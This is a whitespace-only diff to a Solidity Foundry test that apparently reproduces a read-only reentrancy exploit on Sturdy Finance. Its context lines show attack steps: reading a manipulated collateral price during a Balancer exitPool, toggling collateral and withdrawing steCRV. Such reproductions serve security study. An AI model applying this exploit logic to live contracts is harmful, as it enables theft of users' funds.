@@ -133,7 +133,7 @@ contract ContractTest is Test {
 
         emit log_named_decimal_uint(
             "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
-        );
+            );
     }
 
     function executeOperation(
@@ -278,7 +278,7 @@ contract Exploiter is Test {
             "Before Read-Only-Reentrancy Collateral Price \t",
             SturdyOracle.getAssetPrice(cB_stETH_STABLE),
             B_STETH_STABLE.decimals()
-        );
+            );
         Balancer.exitPool(poolId, address(this), payable(address(this)), request);
     }
 
@@ -292,7 +292,7 @@ contract Exploiter is Test {
                 "In Read-Only-Reentrancy Collateral Price \t",
                 SturdyOracle.getAssetPrice(cB_stETH_STABLE),
                 B_STETH_STABLE.decimals()
-            );
+                );
             console.log("7. set steCRV as non-collateral during the manipulation.");
             lendingPool.setUserUseReserveAsCollateral(address(csteCRV), false);
         }
@@ -303,7 +303,7 @@ contract Exploiter is Test {
             "After Read-Only-Reentrancy Collateral Price \t",
             SturdyOracle.getAssetPrice(cB_stETH_STABLE),
             B_STETH_STABLE.decimals()
-        );
+            );
         console.log("");
         console.log("8. Withdraw 1,000 steCRV from Sturdy.");
         ConvexCurveLPVault2.withdrawCollateral(address(steCRV), 1000 * 1e18, 10, address(this)); // Withdraw 1,000 steCRV from Sturdy.
